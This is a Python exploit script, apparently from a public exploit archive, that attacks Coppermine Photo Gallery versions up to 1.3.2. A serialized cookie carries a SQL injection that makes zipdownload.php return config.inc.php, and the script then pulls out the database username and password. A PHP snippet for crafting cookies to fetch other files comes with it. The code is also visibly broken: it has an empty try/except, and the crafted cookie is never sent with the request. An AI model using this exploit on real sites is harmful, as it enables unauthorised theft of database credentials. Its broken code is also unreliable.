Coppermine Photo Gallery <= 1.3.2 File Retrieval SQL Injection Exploit
======================================================================



# tested and approved /str0ke

#CPG Exploit
#File Retrieval by SQL Injection.
#By Default this exploit get the config.inc.php file which
#contains the db user/pass
#If you want to get another file you need to have the good cookie
#you can use this phpscript to get good cookie :
##<?
##$tab[]=$_GET[&#039;inj&#039;];
##$val=base64_encode(serialize($tab));
##echo $val;
##?>
#
#By DiGiTAL_MiDWAY


import urllib2, sys
from urllib import urlencode
import zipfile

if(len(sys.argv)<2):
    sys.exit(0)
site=sys.argv[1]
try:
except:

print &#039;&#039;&#039;File Retrieval by SQL Injection for Coppermine Photo Gallery v<=1.3.2
                   by DiGiTAL_MiDWAY [digital.midway@gmail.com]&#039;&#039;&#039;

cook=&#039;YToxOntpOjA7czo1MToiJycpIFVOSU9OIFNFTEVDVCAnLi4vaW5jbHVkZS8nLCAnY29uZmlnLmluYy5waHAnIC8qIjt9&#039;
# &#039;&#039;) UNION SELECT filepath,file /*

req=urllib2.Request(site+&#039;zipdownload.php&#039;)

zip=open(&#039;test.zip&#039;, &#039;wb&#039;)
print &#039;[+]Opening WebPage&#039;
try:
    f=urllib2.urlopen(req).read()
except:
    print &#039;[+]Failed to opening website&#039;, sys.exc_info()
    sys.exit(0)
zip.write(f)
zip.close()
monzip=zipfile.ZipFile(&#039;test.zip&#039;, &#039;r&#039;)
try:
    conf=monzip.read(&#039;config.inc.php&#039;)
except:
    print &#039;[+]Exploit failed....&#039;
    sys.exit(0)
monzip.close()
conf=conf[conf.find("$CONFIG[&#039;dbuser&#039;] =")+len("$CONFIG[&#039;dbuser&#039;] ="):]
conf=conf[conf.find("&#039;")+1:]
user=conf[:conf.find("&#039;")]
conf=conf[conf.find("$CONFIG[&#039;dbpass&#039;] =")+len("$CONFIG[&#039;dbpass&#039;] ="):]
conf=conf[conf.find("&#039;")+1:]
passwd=conf[:conf.find("&#039;")]
print &#039;[+]Exploit Succeed&#039;
print &#039;[+]User :&#039;, user, &#039;Pass :&#039;, passwd



